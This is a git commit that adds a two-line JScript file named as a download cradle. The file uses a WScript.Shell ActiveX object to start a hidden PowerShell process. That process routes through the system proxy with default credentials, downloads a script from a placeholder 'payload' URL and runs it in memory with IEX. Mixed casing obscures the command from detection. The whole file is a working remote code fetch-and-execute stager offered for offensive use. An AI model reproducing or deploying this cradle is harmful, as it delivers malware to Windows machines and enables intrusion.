943b5dce1e8c8d0d0c23dc658ab6d0562b8b801e
VirtualAllocEx <50073731+VirtualAlllocEx@users.noreply.github.com>
2021-05-14 11:32:48 +0200

    Create JS_Download:Cradle.js

---
+++ JS_Download:Cradle.js
@@ -0,0 +1,2 @@
+a=new ActiveXObject("wsCripT.sHell");
+a.run('PoWeRsHeLl.eXe -NoP -w HiDDen -c $a=neW-ObJeCT nET.wEbClieNt;$a.pRoXy=[NeT.WeBreQueSt]::geTsyStEmweBprOxy();$a.prOxY.crEdEnTials=[NEt.crEdEnTiaLcaChe]::deFaUltcrEdeNtials;IEX $a.DowNlOadstRing(\'https://Link to your payload\')', 0);
